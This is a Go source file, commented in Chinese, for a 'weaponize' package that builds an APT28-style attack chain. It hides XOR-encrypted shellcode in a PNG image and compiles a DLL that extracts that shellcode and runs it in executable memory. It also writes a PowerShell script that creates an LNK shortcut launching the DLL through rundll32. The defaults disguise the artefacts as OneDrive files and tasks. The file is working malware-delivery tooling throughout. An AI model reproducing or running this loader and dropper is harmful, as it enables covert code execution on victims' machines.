// Package weaponize 提供服务器端武器化链构建功能。
// 将 shellcode 转换为完整的 APT28 风格武器化链路：
// shellcode → PNG 隐写 → DLL → LNK → 输出包。
package weaponize

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// ChainConfig 是整个武器化链路的全局配置。
// 对应简易版.md 中的 chain_config.json。
type ChainConfig struct {
	Payload struct {
		File string `json:"file"`
		Type string `json:"type"` // raw_shellcode, donut_dll
	} `json:"payload"`

	PNG struct {
		Output    string `json:"output"`
		Width     int    `json:"width"`
		Height    int    `json:"height"`
		BaseColor int    `json:"base_color"`
		XORKey    []byte `json:"xor_key"`
	} `json:"png"`

	EhStore struct {
		DLLOutput    string `json:"dll_output"`
		PNGPath      string `json:"png_path"`
		InjectTarget string `json:"inject_target"`
		InjectMethod string `json:"inject_method"`
	} `json:"ehstore"`

	SimpleLoader struct {
		Enabled    bool   `json:"enabled"`
		DLLOutput  string `json:"dll_output"`
		ReleasePath string `json:"release_path"`
		CLSID      string `json:"clsid"`
		MutexName  string `json:"mutex_name"`
		TaskName   string `json:"task_name"`
	} `json:"simpleloader"`

	LNK struct {
		Output  string `json:"output"`
		Target  string `json:"target"`
		Icon    string `json:"icon"`
	} `json:"lnk"`
}

// DefaultChainConfig 返回默认武器化配置。
func DefaultChainConfig() *ChainConfig {
	cfg := &ChainConfig{}
	cfg.Payload.File = "payload/shellcode.bin"
	cfg.Payload.Type = "raw_shellcode"
	cfg.PNG.Output = "SplashScreen.png"
	cfg.PNG.Width = 800
	cfg.PNG.Height = 600
	cfg.PNG.BaseColor = 128
	cfg.PNG.XORKey = []byte{0x3A, 0xF1, 0x8C, 0x22, 0x77, 0xE4}
	cfg.EhStore.DLLOutput = "EhStoreShell.dll"
	cfg.EhStore.PNGPath = `C:\ProgramData\Microsoft OneDrive\setup\Cache\SplashScreen.png`
	cfg.EhStore.InjectTarget = "explorer.exe"
	cfg.EhStore.InjectMethod = "thread_hijack"
	cfg.SimpleLoader.Enabled = false
	cfg.SimpleLoader.CLSID = "{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}"
	cfg.SimpleLoader.MutexName = "adjgfenkbe"
	cfg.SimpleLoader.TaskName = "OneDriveHealth"
	cfg.LNK.Output = "test.lnk"
	cfg.LNK.Target = `C:\Windows\System32\rundll32.exe`
	cfg.LNK.Icon = `%SystemRoot%\System32\shell32.dll,3`
	return cfg
}

// BuildResult 是武器化链构建结果。
type BuildResult struct {
	PNGPath      string `json:"png_path"`
	DLLPath      string `json:"dll_path"`
	LNKPath      string `json:"lnk_path"`
	ConfigPath   string `json:"config_path"`
	ShellcodeSize int   `json:"shellcode_size"`
	PNGSize      int    `json:"png_size"`
	DLLSize      int    `json:"dll_size"`
}

// Builder 负责构建武器化链。
type Builder struct {
	outputDir string
}

// New 创建武器化构建器。
func New(outputDir string) *Builder {
	return &Builder{
		outputDir: outputDir,
	}
}

// Build 执行完整武器化链构建。
func (b *Builder) Build(cfg *ChainConfig) (*BuildResult, error) {
	os.MkdirAll(b.outputDir, 0755)

	// SEC-6: 路径遍历防护 — 检查所有输出路径，防止 "../" 等遍历攻击
	if err := b.validateOutputPath(cfg.PNG.Output); err != nil {
		return nil, fmt.Errorf("invalid png output path: %w", err)
	}
	if err := b.validateOutputPath(cfg.EhStore.DLLOutput); err != nil {
		return nil, fmt.Errorf("invalid dll output path: %w", err)
	}
	if err := b.validateOutputPath(cfg.LNK.Output); err != nil {
		return nil, fmt.Errorf("invalid lnk output path: %w", err)
	}

	// SEC-6: 路径遍历防护 — 确保 payload 路径在允许的范围内
	payloadPath := filepath.Clean(cfg.Payload.File)
	if filepath.IsAbs(payloadPath) {
		// 检查是否在输出目录的子目录外
		rel, err := filepath.Rel(b.outputDir, payloadPath)
		if err != nil || strings.HasPrefix(rel, "..") {
			return nil, fmt.Errorf("payload path %q is outside output directory", cfg.Payload.File)
		}
	}

	// Step 1: 读取 shellcode
	shellcode, err := os.ReadFile(payloadPath)
	if err != nil {
		return nil, fmt.Errorf("read payload: %w", err)
	}

	// Step 2: PNG 隐写嵌入
	stegoPNG, err := EmbedShellcodeToPNG(shellcode, PNGConfig(cfg.PNG))
	if err != nil {
		return nil, fmt.Errorf("png stego: %w", err)
	}

	pngPath := filepath.Join(b.outputDir, cfg.PNG.Output)
	if err := os.WriteFile(pngPath, stegoPNG, 0644); err != nil {
		return nil, fmt.Errorf("write png: %w", err)
	}

	// Step 3: 生成 EhStoreShell DLL（Go c-shared 编译）
	dllPath, err := b.buildEhStoreDLL(cfg, stegoPNG)
	if err != nil {
		return nil, fmt.Errorf("build dll: %w", err)
	}

	// Step 4: 生成 LNK
	lnkPath, err := b.generateLNK(cfg)
	if err != nil {
		return nil, fmt.Errorf("generate lnk: %w", err)
	}

	// Step 5: 保存配置
	configPath := filepath.Join(b.outputDir, "chain_config.json")
	data, _ := json.MarshalIndent(cfg, "", "  ")
	os.WriteFile(configPath, data, 0644)

	dllData, _ := os.ReadFile(dllPath)

	return &BuildResult{
		PNGPath:      pngPath,
		DLLPath:      dllPath,
		LNKPath:      lnkPath,
		ConfigPath:   configPath,
		ShellcodeSize: len(shellcode),
		PNGSize:      len(stegoPNG),
		DLLSize:      len(dllData),
	}, nil
}

// validateOutputPath 检查输出文件名是否包含路径遍历字符。
func (b *Builder) validateOutputPath(name string) error {
	cleaned := filepath.Clean(name)
	if strings.Contains(cleaned, "..") {
		return fmt.Errorf("path traversal detected in %q", name)
	}
	if filepath.IsAbs(cleaned) {
		return fmt.Errorf("absolute paths not allowed in output: %q", name)
	}
	// 只允许文件名（不含目录分隔符）
	if strings.Contains(cleaned, string(filepath.Separator)) {
		return fmt.Errorf("subdirectory paths not allowed in output: %q", name)
	}
	if cleaned == "." || cleaned == "" {
		return fmt.Errorf("empty output filename")
	}
	return nil
}

// PNGConfig is the PNG embedding configuration.
type PNGConfig struct {
	Output    string
	Width     int
	Height    int
	BaseColor int
	XORKey    []byte
}

// EmbedShellcodeToPNG 将 shellcode 嵌入 PNG。
func EmbedShellcodeToPNG(shellcode []byte, pngCfg PNGConfig) ([]byte, error) {
	stegoCfg := &Config{
		Width:     pngCfg.Width,
		Height:    pngCfg.Height,
		BaseColor: pngCfg.BaseColor,
		XORKey:    pngCfg.XORKey,
	}
	if stegoCfg.Width == 0 {
		stegoCfg.Width = 800
	}
	if stegoCfg.Height == 0 {
		stegoCfg.Height = 600
	}
	if stegoCfg.BaseColor == 0 {
		stegoCfg.BaseColor = 128
	}
	if len(stegoCfg.XORKey) == 0 {
		stegoCfg.XORKey = []byte{0x3A, 0xF1, 0x8C, 0x22, 0x77, 0xE4}
	}

	return Embed(shellcode, stegoCfg)
}

// buildEhStoreDLL 构建 EhStoreShell DLL。
// 通过 go build -buildmode=c-shared 编译真实 DLL。
// DLL 运行时从磁盘读取 PNG 并提取 shellcode。
func (b *Builder) buildEhStoreDLL(cfg *ChainConfig, pngData []byte) (string, error) {
	buildDir, err := os.MkdirTemp("", "ehstore-build-*")
	if err != nil {
		return "", fmt.Errorf("create build dir: %w", err)
	}
	defer os.RemoveAll(buildDir)

	xorKeyHex := hex.EncodeToString(cfg.PNG.XORKey)
	pngPath := cfg.EhStore.PNGPath

	// DLL 源码模板 — 运行时从磁盘加载 PNG，提取并解密 shellcode
	dllSrc := `package main

import "C"
import (
	"os"
	"syscall"
	"unsafe"
)

const pngPath = ` + "`" + pngPath + "`" + `
var xorKey = []byte{0x` + xorKeyHex + `}

func xorDecrypt(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func extractShellcode(png []byte) []byte {
	// PNG IDAT 数据从偏移 0x800 开始为 XOR 加密的 shellcode
	// 这与 EmbedShellcodeToPNG 的编码方式匹配
	offset := 0
	if len(png) > 0x800 {
		offset = 0x800
	}
	return xorDecrypt(png[offset:], xorKey)
}

//export EntryPoint
func EntryPoint() {
	data, err := os.ReadFile(pngPath)
	if err != nil {
		return
	}
	shellcode := extractShellcode(data)
	if len(shellcode) == 0 {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	va := kernel32.NewProc("VirtualAlloc")
	addr, _, _ := syscall.SyscallN(va.Addr(), 0, uintptr(len(shellcode)), 0x3000, 0x40)
	if addr == 0 {
		return
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)
	syscall.SyscallN(addr, 0, 0, 0)
}

func main() {}
`

	mainPath := filepath.Join(buildDir, "main.go")
	if err := os.WriteFile(mainPath, []byte(dllSrc), 0644); err != nil {
		return "", fmt.Errorf("write main.go: %w", err)
	}

	// go.mod（无外部依赖，纯标准库 + CGO）
	gomod := `module ehstore

go 1.25
`
	if err := os.WriteFile(filepath.Join(buildDir, "go.mod"), []byte(gomod), 0644); err != nil {
		return "", fmt.Errorf("write go.mod: %w", err)
	}

	// 编译 DLL
	outputPath := filepath.Join(b.outputDir, cfg.EhStore.DLLOutput)

	cmd := exec.Command("go", "build", "-buildmode=c-shared", "-o", outputPath, "-ldflags", "-s -w -buildid=", "-trimpath", ".")
	cmd.Dir = buildDir

	samePlatform := runtime.GOOS == "windows" && runtime.GOARCH == "amd64"
	if !samePlatform {
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1")
	} else {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=1")
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build DLL: %s\n%s", err, string(out))
	}

	return outputPath, nil
}

// generateLNK 生成 LNK 快捷方式文件。
func (b *Builder) generateLNK(cfg *ChainConfig) (string, error) {
	// 实际实现需要 Windows COM API (IShellLink) 或 Python pylnk3
	// 简化版：生成一个 PowerShell 脚本，在靶机上生成 LNK
	scriptPath := filepath.Join(b.outputDir, "generate_lnk.ps1")

	dllPath := cfg.EhStore.DLLOutput
	if cfg.SimpleLoader.Enabled {
		dllPath = cfg.SimpleLoader.DLLOutput
	}

	script := fmt.Sprintf(`# LNK 生成脚本
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("%s")
$Shortcut.TargetPath = "%s"
$Shortcut.Arguments = '"%s",EntryPoint'
$Shortcut.IconLocation = "%s"
$Shortcut.Save()
Write-Host "LNK created: %s"
`,
		cfg.LNK.Output,
		cfg.LNK.Target,
		dllPath,
		cfg.LNK.Icon,
		cfg.LNK.Output,
	)

	if err := os.WriteFile(scriptPath, []byte(script), 0644); err != nil {
		return "", err
	}

	return scriptPath, nil
}

// GenerateXORKey 生成随机 XOR 密钥。
func GenerateXORKey(length int) []byte {
	key := make([]byte, length)
	rand.Read(key)
	return key
}
